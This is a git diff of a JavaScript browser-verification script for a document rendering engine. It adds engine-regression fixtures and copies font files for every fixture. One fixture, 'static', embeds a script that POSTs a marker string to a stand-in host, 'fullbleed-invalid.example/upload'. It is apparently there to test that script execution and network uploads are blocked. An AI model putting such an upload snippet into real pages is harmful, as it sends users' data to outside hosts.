@@ -7,6 +7,7 @@ import { resolve, join, dirname } from 'node:path';
 import { pathToFileURL } from 'node:url';
 import { inlineFixtures } from '../test/inline-wrapping.mjs';
 import { standardFontFixtures } from '../test/standard-fonts.mjs';
+import { engineRegressionFixtures } from '../test/engine-regressions.mjs';
 
 const root = resolve('.');
 const out = join(root, 'output/browser-verification');
@@ -36,13 +37,16 @@ const fixture = async name => ({ html: await readFile(`examples/${name}.html`, '
 const inputs = { invoice: await fixture('invoice'), report: await fixture('report'),
   ...Object.fromEntries(inlineFixtures.map(({ name, pages, ...input }) => [name, { ...input, previewDpi: 96 }])),
   ...Object.fromEntries(standardFontFixtures.map(({ name, font, pages, ...input }) => [name, { ...input, previewDpi: 72 }])),
+  ...Object.fromEntries(engineRegressionFixtures.map(({ name, pages, ...input }) => [name, input])),
   custom: { html: '<h1>Local asset test</h1><p>Integral: ⨌</p><img src="assets/brand/logo.svg" width="80" height="40">',
     css: "body {font-family:Inter,'Noto Sans Math'}", previewDpi: 72,
     fontFiles: ['NotoSansMath-Regular.ttf'],
     assetTexts: { 'brand/logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="#175c52"/></svg>' } },
   static: { html: '<script>globalThis.documentUploadExecuted = true; fetch("https://fullbleed-invalid.example/upload", {method:"POST",body:"PRIVATE_BROWSER_MARKER"});</script><h1>PRIVATE_BROWSER_MARKER</h1><img src="https://fullbleed-invalid.example/picture.png">', css: '', previewDpi: 0 },
 };
-await copyFile('test/fonts/NotoSansMath-Regular.ttf', join(site, 'fixtures/NotoSansMath-Regular.ttf'));
+for (const file of new Set(Object.values(inputs).flatMap(input => input.fontFiles ?? []))) {
+  await copyFile('test/fonts/' + file, join(site, 'fixtures', file));
+}
 await writeFile(join(site, 'fixtures/inputs.json'), JSON.stringify(inputs, null, 2) + '\n');
 const baselines = {};
 for (const [name, fixture] of Object.entries(inputs)) {
